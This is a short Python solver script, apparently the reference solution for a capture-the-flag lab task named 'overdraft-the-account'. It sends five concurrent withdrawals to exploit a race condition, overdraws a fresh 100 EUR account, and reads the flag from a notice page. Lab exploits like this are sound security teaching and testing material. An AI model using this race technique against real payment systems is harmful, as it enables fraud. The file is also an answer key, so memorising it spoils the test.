"""Intended-path solver: concurrent withdrawals win the TOCTOU race."""

import re
import time
from concurrent.futures import ThreadPoolExecutor

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

ACCOUNT_RE = re.compile(r'<code class="acct">([0-9a-f]{16})</code>')


def _withdraw(base: str, token: str) -> httpx.Response:
    return httpx.post(f"{base}/withdraw", data={"token": token, "amount_cents": "6000"}, timeout=10)


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    detail = "no attempts completed"
    captured = None
    for attempt in range(6):
        opened = httpx.post(f"{base}/open", data={"name": f"solver-{attempt}"}, timeout=10)
        match = ACCOUNT_RE.search(opened.text)
        if match is None:
            detail = f"attempt {attempt}: could not read an account token"
            continue
        token = match.group(1)

        # Each round uses a fresh 100.00 EUR account, so the solver is
        # idempotent across harness restarts.
        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = [pool.submit(_withdraw, base, token) for _ in range(5)]
            responses = [f.result() for f in futures]
        bodies = "\n".join(r.text for r in responses)
        if "/notice/" not in bodies:
            detail = f"attempt {attempt}: no withdrawal overdrafted ({bodies.count('approved')} approved)"
            time.sleep(0.5)
            continue

        notice = httpx.get(f"{base}/notice/{token}", timeout=10)
        flags = find_flags(notice.text)
        if flags:
            captured = flags[0]
            break
        detail = f"attempt {attempt}: notice page had no flag"
        time.sleep(0.5)
    return SolveResult(
        results=[
            TaskResult(
                task_id="overdraft-the-account",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else detail,
            )
        ]
    )
